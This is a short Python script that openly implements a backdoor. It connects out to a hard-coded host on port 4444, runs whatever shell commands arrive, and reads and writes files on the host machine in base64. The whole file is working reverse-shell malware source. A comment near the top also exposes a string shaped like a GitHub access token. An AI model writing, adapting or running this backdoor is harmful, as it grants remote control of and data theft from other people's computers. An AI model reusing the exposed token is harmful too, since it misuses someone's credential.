import socket
import subprocess
import json
import os
import base64

#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

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError:
            return "Error in executing command"
        
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path
     
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successfully."

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                 json_data = json_data + self.connection.recv(1024)
                 return json.loads(json_data)
            except ValueError:
                continue

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()

                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])

                elif command[0] == "download":
                    command_result = self.read_file(command[1])
            
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
            
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error in command execution" 

            self.reliable_send(command_result)
       
               
    
 
my_backdoor=Backdoor(("10.0.2.15"), 4444)
my_backdoor.run()


#connection.send("\n[+]connection established.\n")


